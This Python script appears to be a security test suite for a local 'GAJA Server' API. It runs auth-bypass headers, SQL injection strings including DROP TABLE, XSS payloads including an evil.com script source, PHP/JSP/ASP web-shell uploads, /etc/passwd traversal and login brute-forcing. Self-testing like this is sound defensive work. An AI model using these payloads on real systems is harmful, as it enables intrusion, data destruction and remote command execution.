#!/usr/bin/env python3
"""GAJA Server API Endpoints Attack Tests Specialized stress tests targeting discovered
API endpoints from OpenAPI schema."""

import asyncio
import json
import logging
import random
import string
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import aiohttp
import requests

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(levelname)s:%(name)s:%(message)s")
logger = logging.getLogger(__name__)

BASE_URL = "http://localhost:8001"


class APIEndpointAttacker:
    def __init__(self):
        self.results = []
        self.endpoints = [
            "/api/v1/auth/login",
            "/api/v1/auth/magic-link",
            "/api/v1/me",
            "/api/v1/me/settings",
            "/api/v1/memory",
            "/api/v1/memory/test-memory-id",
            "/api/v1/plugins",
            "/api/v1/plugins/test-plugin",
            "/api/v1/metrics",
            "/api/v1/logs",
            "/api/v1/healthz",
            "/api/v1/status",
            "/api/v1/ai/query",
            "/api/v1/ws/status",
            "/api/v1/briefing/daily",
            "/api/v1/admin/stats",
            "/api/v1/webui",
            "/health",
            "/api/status",
            "/status/stream",
            "/",
        ]

    def check_server(self):
        """Check if server is accessible."""
        try:
            response = requests.get(f"{BASE_URL}/health", timeout=5)
            return response.status_code == 200
        except:
            return False

    def test_endpoint_enumeration(self):
        """Test all discovered endpoints."""
        logger.info("🔍 Testing API Endpoint Enumeration")

        endpoint_results = []

        for endpoint in self.endpoints:
            try:
                url = f"{BASE_URL}{endpoint}"

                # Test GET
                response = requests.get(url, timeout=10)
                endpoint_results.append(f"GET {endpoint}: {response.status_code}")
                logger.info(f"GET {endpoint}: {response.status_code}")

                # Test POST with empty body
                if endpoint not in ["/health", "/", "/api/status"]:
                    post_response = requests.post(url, json={}, timeout=10)
                    endpoint_results.append(
                        f"POST {endpoint}: {post_response.status_code}"
                    )
                    logger.info(f"POST {endpoint}: {post_response.status_code}")

            except Exception as e:
                endpoint_results.append(f"{endpoint}: Failed - {e}")
                logger.error(f"Failed endpoint {endpoint}: {e}")

        return endpoint_results

    def test_auth_bypass_attacks(self):
        """Test authentication bypass attacks."""
        logger.info("🔓 Testing Authentication Bypass Attacks")

        auth_bypass_results = []
        protected_endpoints = [
            "/api/v1/me",
            "/api/v1/me/settings",
            "/api/v1/memory",
            "/api/v1/plugins",
            "/api/v1/metrics",
            "/api/v1/logs",
            "/api/v1/healthz",
            "/api/v1/ai/query",
            "/api/v1/ws/status",
            "/api/v1/briefing/daily",
            "/api/v1/admin/stats",
        ]

        bypass_headers = [
            {},
            {"Authorization": "Bearer fake-token"},
            {"Authorization": "Bearer null"},
            {"Authorization": "Bearer undefined"},
            {"Authorization": "Bearer admin"},
            {"Authorization": "Bearer " + "A" * 1000},
            {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
            {"Authorization": "Basic dGVzdDp0ZXN0"},  # test:test
            {"X-API-Key": "admin"},
            {"X-Auth-Token": "bypass"},
            {"X-User-ID": "1"},
            {"X-Admin": "true"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"User-Agent": "GAJA-Internal"},
            {"Referer": "http://localhost:8001/"},
        ]

        for endpoint in protected_endpoints:
            for headers in bypass_headers:
                try:
                    url = f"{BASE_URL}{endpoint}"
                    response = requests.get(url, headers=headers, timeout=5)

                    if response.status_code not in [401, 403]:
                        auth_bypass_results.append(
                            f"BYPASS {endpoint} with {headers}: {response.status_code}"
                        )
                        logger.warning(
                            f"⚠️ Potential bypass {endpoint} with {headers}: {response.status_code}"
                        )

                except Exception as e:
                    pass

        return auth_bypass_results

    def test_sql_injection_attacks(self):
        """Test SQL injection attacks."""
        logger.info("💉 Testing SQL Injection Attacks")

        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "' OR 1=1 --",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "1' OR '1'='1' /*",
            "1' OR '1'='1' #",
            "1' OR '1'='1' --",
            "1') OR ('1'='1' /*",
            "1') OR ('1'='1' #",
            "1') OR ('1'='1' --",
        ]

        sql_results = []

        # Test login endpoint
        login_url = f"{BASE_URL}/api/v1/auth/login"
        for payload in sql_payloads:
            try:
                data = {"email": payload, "password": payload}
                response = requests.post(login_url, json=data, timeout=10)

                if response.status_code == 200:
                    sql_results.append(f"SQL injection successful with: {payload}")
                    logger.warning(f"⚠️ Potential SQL injection: {payload}")

                # Check for SQL error messages
                content = response.text.lower()
                if any(
                    error in content
                    for error in [
                        "sql",
                        "mysql",
                        "postgresql",
                        "sqlite",
                        "database",
                        "syntax error",
                    ]
                ):
                    sql_results.append(f"SQL error leaked with: {payload}")
                    logger.warning(f"⚠️ SQL error leaked: {payload}")

            except Exception as e:
                pass

        # Test memory endpoint with SQL in memory_id
        for payload in sql_payloads[:5]:  # Test subset to avoid spam
            try:
                memory_url = f"{BASE_URL}/api/v1/memory/{payload}"
                response = requests.delete(memory_url, timeout=5)

                content = response.text.lower()
                if any(
                    error in content
                    for error in ["sql", "mysql", "postgresql", "sqlite", "database"]
                ):
                    sql_results.append(f"SQL error in memory endpoint: {payload}")
                    logger.warning(f"⚠️ SQL error in memory: {payload}")

            except Exception as e:
                pass

        return sql_results

    def test_xss_attacks(self):
        """Test XSS attacks."""
        logger.info("🚨 Testing XSS Attacks")

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=\"alert('XSS')\">",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<<SCRIPT>alert('XSS')<</SCRIPT>",
            "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
        ]

        xss_results = []

        # Test user settings endpoint
        settings_url = f"{BASE_URL}/api/v1/me/settings"
        for payload in xss_payloads:
            try:
                data = {"voice": payload, "language": payload, "wakeWord": payload}
                response = requests.patch(settings_url, json=data, timeout=10)

                # Check if payload is reflected
                if payload in response.text:
                    xss_results.append(f"XSS reflected: {payload}")
                    logger.warning(f"⚠️ XSS reflected: {payload}")

            except Exception as e:
                pass

        # Test AI query endpoint
        ai_url = f"{BASE_URL}/api/v1/ai/query"
        for payload in xss_payloads[:5]:  # Test subset
            try:
                data = {"message": payload, "context": payload}
                response = requests.post(ai_url, json=data, timeout=10)

                if payload in response.text:
                    xss_results.append(f"XSS in AI query: {payload}")
                    logger.warning(f"⚠️ XSS in AI query: {payload}")

            except Exception as e:
                pass

        return xss_results

    def test_parameter_pollution(self):
        """Test HTTP Parameter Pollution."""
        logger.info("🔀 Testing Parameter Pollution")

        pollution_results = []

        # Test memory endpoint with pagination pollution
        memory_url = f"{BASE_URL}/api/v1/memory"
        pollution_params = [
            "?page=1&page=999&page=-1",
            "?limit=20&limit=999999&limit=0",
            "?page[]=1&page[]=2&page=3",
            "?limit%20=10&limit=20",
            "?page=1;DROP TABLE memories;--&page=1",
        ]

        for params in pollution_params:
            try:
                url = f"{memory_url}{params}"
                response = requests.get(url, timeout=10)

                if response.status_code == 200:
                    pollution_results.append(f"Parameter pollution accepted: {params}")
                    logger.info(
                        f"Parameter pollution: {params} -> {response.status_code}"
                    )

            except Exception as e:
                pass

        return pollution_results

    def test_rate_limiting(self):
        """Test rate limiting."""
        logger.info("⚡ Testing Rate Limiting")

        # Rapid requests to login endpoint
        login_url = f"{BASE_URL}/api/v1/auth/login"
        failed_logins = 0

        for i in range(100):
            try:
                data = {"email": f"user{i}@test.com", "password": "wrongpassword"}
                response = requests.post(login_url, json=data, timeout=5)

                if response.status_code == 429:  # Too Many Requests
                    logger.info(f"Rate limiting activated after {i+1} requests")
                    return f"Rate limiting activated after {i+1} requests"
                elif response.status_code in [401, 403]:
                    failed_logins += 1

            except Exception as e:
                pass

        return f"No rate limiting detected after 100 failed login attempts"

    def test_file_upload_attacks(self):
        """Test file upload attacks (if any upload endpoints exist)"""
        logger.info("📁 Testing File Upload Attacks")

        upload_results = []

        # Look for potential upload endpoints
        upload_endpoints = [
            "/api/v1/upload",
            "/api/v1/files/upload",
            "/api/v1/avatar/upload",
            "/api/v1/documents/upload",
            "/upload",
            "/files/upload",
        ]

        malicious_files = [
            ("test.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
            (
                "test.jsp",
                '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
                "application/x-jsp",
            ),
            ("test.asp", '<% eval(request("cmd")) %>', "application/x-asp"),
            ("test.py", "import os; os.system('id')", "text/x-python"),
            ("test.sh", "#!/bin/bash\\nid", "application/x-sh"),
            (".htaccess", "Options +Indexes", "text/plain"),
            ("web.config", "<configuration></configuration>", "text/xml"),
        ]

        for endpoint in upload_endpoints:
            for filename, content, content_type in malicious_files:
                try:
                    url = f"{BASE_URL}{endpoint}"
                    files = {"file": (filename, content, content_type)}
                    response = requests.post(url, files=files, timeout=10)

                    upload_results.append(
                        f"Upload {endpoint} {filename}: {response.status_code}"
                    )
                    logger.info(
                        f"Upload test {endpoint} {filename}: {response.status_code}"
                    )

                    if response.status_code == 200:
                        logger.warning(
                            f"⚠️ Successful upload: {filename} to {endpoint}"
                        )

                except Exception as e:
                    pass

        return upload_results

    def test_directory_traversal(self):
        """Test directory traversal attacks."""
        logger.info("📂 Testing Directory Traversal")

        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/etc/passwd%00",
            "....\\\\....\\\\....\\\\etc\\\\passwd",
        ]

        traversal_results = []

        # Test file-related endpoints if they exist
        file_endpoints = [
            "/api/v1/files/",
            "/api/v1/download/",
            "/api/v1/static/",
            "/files/",
            "/static/",
            "/download/",
        ]

        for endpoint in file_endpoints:
            for payload in traversal_payloads:
                try:
                    url = f"{BASE_URL}{endpoint}{payload}"
                    response = requests.get(url, timeout=5)

                    # Check for Linux/Unix passwd file content
                    if "root:" in response.text and "/bin/" in response.text:
                        traversal_results.append(
                            f"Directory traversal successful: {endpoint}{payload}"
                        )
                        logger.warning(f"⚠️ Directory traversal: {endpoint}{payload}")

                    # Check for Windows hosts file
                    elif "localhost" in response.text and "127.0.0.1" in response.text:
                        traversal_results.append(
                            f"Directory traversal successful: {endpoint}{payload}"
                        )
                        logger.warning(f"⚠️ Directory traversal: {endpoint}{payload}")

                except Exception as e:
                    pass

        return traversal_results

    def run_all_tests(self):
        """Run all API security tests."""
        if not self.check_server():
            logger.error("❌ Server not accessible")
            return

        logger.info("✅ Server is running, starting API security tests...")
        logger.warning("⚠️ WARNING: These tests may impact server security!")

        logger.info("🔐 Starting API Security Test Suite")
        logger.info("=" * 60)

        start_time = time.time()

        # Run all tests
        endpoint_results = self.test_endpoint_enumeration()
        auth_bypass_results = self.test_auth_bypass_attacks()
        sql_results = self.test_sql_injection_attacks()
        xss_results = self.test_xss_attacks()
        pollution_results = self.test_parameter_pollution()
        rate_limit_result = self.test_rate_limiting()
        upload_results = self.test_file_upload_attacks()
        traversal_results = self.test_directory_traversal()

        total_duration = time.time() - start_time

        # Results summary
        logger.info("=" * 60)
        logger.info("🏁 API Security Test Results")
        logger.info(f"Duration: {total_duration:.2f} seconds")
        logger.info("Results:")
        logger.info(f"  - Endpoint enumeration: {len(endpoint_results)} tested")
        logger.info(
            f"  - Auth bypass attempts: {len(auth_bypass_results)} potential bypasses"
        )
        logger.info(
            f"  - SQL injection tests: {len(sql_results)} potential vulnerabilities"
        )
        logger.info(f"  - XSS tests: {len(xss_results)} potential vulnerabilities")
        logger.info(f"  - Parameter pollution: {len(pollution_results)} accepted")
        logger.info(f"  - Rate limiting: {rate_limit_result}")
        logger.info(f"  - File upload tests: {len(upload_results)} tested")
        logger.info(
            f"  - Directory traversal: {len(traversal_results)} potential vulnerabilities"
        )
        logger.info("=" * 60)

        # Save results
        results_data = {
            "endpoint_enumeration": endpoint_results,
            "auth_bypass_attempts": auth_bypass_results,
            "sql_injection_tests": sql_results,
            "xss_tests": xss_results,
            "parameter_pollution": pollution_results,
            "rate_limiting": rate_limit_result,
            "file_upload_tests": upload_results,
            "directory_traversal": traversal_results,
            "total_duration": total_duration,
            "timestamp": time.time(),
        }

        with open("api_security_test_results.json", "w") as f:
            json.dump(results_data, f, indent=2)

        logger.info("📊 Results saved to api_security_test_results.json")


def main():
    attacker = APIEndpointAttacker()
    attacker.run_all_tests()


if __name__ == "__main__":
    main()
